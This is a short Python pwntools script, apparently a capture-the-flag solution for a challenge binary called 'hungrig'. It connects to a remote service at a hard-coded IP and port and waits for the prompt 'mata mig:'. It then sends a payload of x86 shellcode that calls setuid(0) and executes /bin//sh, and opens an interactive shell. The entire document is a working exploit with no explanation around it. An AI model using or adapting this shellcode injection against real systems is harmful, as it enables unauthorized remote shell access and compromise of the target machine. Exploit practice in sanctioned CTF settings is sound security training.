
import time
from pwn import *

# start the process
r = remote("46.246.39.89", 31332)

#r = process('./hungrig')
r.waitfor("mata mig:")

shell = 
B"MAT\x00\xeb\x04\x00\x00\x00\x00\x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
time.sleep(1)
# send input to the process
r.send_raw(shell)

r.interactive()
